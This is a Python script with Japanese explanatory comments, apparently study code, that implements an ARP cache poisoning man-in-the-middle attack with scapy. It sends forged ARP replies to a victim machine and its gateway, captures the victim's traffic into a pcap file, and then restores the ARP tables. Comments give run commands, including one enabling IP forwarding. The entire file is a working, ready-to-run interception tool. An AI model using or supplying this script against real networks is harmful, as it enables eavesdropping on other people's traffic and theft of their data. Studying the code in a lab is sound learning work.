#ARPキャッシュポイズニング
#標的マシンに対して自分をゲートウェイと誤認識させる


#実行前準備
#ローカルホストマシンをゲートウェイと標的マシンの両方に対してパケットの転送が可能な状態にする
#Kaliの場合
#sudo bash -c　'echo 1 > /proc/sys/net/ipv4/ip_forward'
#sudo python3 arper.py 192.168.56.101 192.168.56.1 eth1

#sindowsマシンが標的だとうまくいかない？macPCで試す

from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

#MACアドレスを取得
def get_mac(targetip):
    #パケットが　ブロードキャストされるように設定する。ARP関数でMACアドレスを問い合わせている
    #各ノードに対して対象IPアドレスを持っているかを問い合わせるパケットが作成される
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    #srp データリンク層でのパケットの送受信が可能。これを使って送信する
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper():
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    #攻撃の起点メソッド
    #2つのプロセスを作成する。
    #ARPキャッシュポイズニング、ＡＲＰキャッシュポイズニングにより自ホストに流れてきたパケットを盗聴する事による攻撃の進行状況を監視するプロセス
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    #標的マシンとゲートウェイのＡＲＰキャッシュを汚染するためのパケットを構築し送信
    #ARPキャッシュを汚染する
    def poison(self):
        #標的マシン向けのＡＲＰキャッシュポイズニング用のパケットを作成
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        #同様手順でゲートウェイ向けのパケットも作成
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')

        #ARPキャッシュポイズニング用パケットを送信し続け、攻撃実施中はそれぞれＡＲＰキャッシュエントリーが確実に汚染された状態にあり続けるようにする
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                #攻撃前の状態に戻す
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    #攻撃時に実際に攻撃の様子を観察して記録する。ネットワーク通信を盗聴する
    def sniff(self, count=1000):
        #ARPキャッシュが汚染されるまでの待機時間
        time.sleep(5)
        print(f'Sniffing {count} packets')
        #標的マシンのＩＰを持つパケットのみをフィルタリング
        bpf_filter = "ip host %s" % self.victim
        #指定数のパケットを盗聴
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        #パケットキャプチャ終了後、得られたパケットを書き出す
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        #元の状態に戻す
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    #poisonにおいてＣＴＲＬ＋Ｃまたはsniffにおいて指定された数のパケットのキャプチャが終了した場合に実行される
    def restore(self):
        print('Restoring ARP tables...')
        #標的マシンに対してはゲートウェイについて、もともとのＩＰとＭＡＣアドレスの情報を送信
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)
        #ゲートウェイに対しては標的マシンについて、もともとのＩＰとＭＡＣアドレスの情報を送信する
        send(ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,
                pdst=self.gateway,
                hwdst='ff:ff:ff:ff:ff:ff'),
             count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
